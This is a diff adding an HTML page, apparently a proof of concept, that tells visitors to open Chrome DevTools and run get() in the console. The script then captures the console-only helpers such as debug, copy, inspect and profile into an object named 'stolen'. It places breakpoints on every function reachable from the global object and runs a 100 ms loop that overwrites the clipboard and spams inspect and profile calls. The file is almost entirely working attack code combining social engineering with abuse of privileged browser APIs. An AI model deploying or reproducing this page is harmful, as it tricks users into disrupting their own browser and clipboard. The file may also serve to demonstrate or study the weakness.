@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Access the Chrome Command Line API</title>
+</head>
+
+<body>
+  <p>please open <strong>inspect element</strong> and run <code>get()</code> in
+  the <strong>console</strong></p>
+  <script>
+    const names = [
+      'dir', 'dirxml', 'profile', 'profileEnd', 'clear', 'table', 'keys',
+      'values', 'debug', 'undebug', 'monitor', 'unmonitor', 'inspect', 'copy',
+      'queryObjects', '$_', '$0', '$1', '$2', '$3', '$4', 'getEventListeners',
+      'monitorEvents', 'unmonitorEvents', '$', '$$', '$x'
+    ]
+    const stolen = {}
+    function get () {
+      for (const name of names) {
+        if (name in window) {
+          stolen[name] = window[name]
+        }
+      }
+      document.write('muahahaha')
+      const visited = new Set([Object.entries, Object.getOwnPropertyDescriptors])
+      stolen.undebug(Object.entries)
+      stolen.undebug(Object.getOwnPropertyDescriptors)
+      function debugValue (value) {
+        if (visited.has(value)) return
+        if (value === null) return
+        if (typeof value === 'function') {
+          stolen.debug(value)
+          // stolen.undebug(value)
+        } else if (typeof value !== 'object') {
+          return
+        }
+        visited.add(value)
+        debugFunc(value)
+      }
+      function debugFunc (value) {
+        for (const [key, val] of Object.entries(Object.getOwnPropertyDescriptors(value))) {
+          if ('value' in val) {
+            debugValue(val.value)
+          } else {
+            debugValue(val.get)
+            debugValue(val.set)
+          }
+        }
+      }
+      debugValue(globalThis)
+      visited.delete(Object.entries)
+      visited.delete(Object.getOwnPropertyDescriptors)
+      debugValue(Object.entries)
+      debugValue(Object.getOwnPropertyDescriptors)
+      setInterval(() => {
+        stolen.inspect(document.body)
+        stolen.copy(window)
+        stolen.profile('wee' + Math.random() + 'lol')
+      }, 100)
+    }
+  </script>
+</body>
+
+</html>
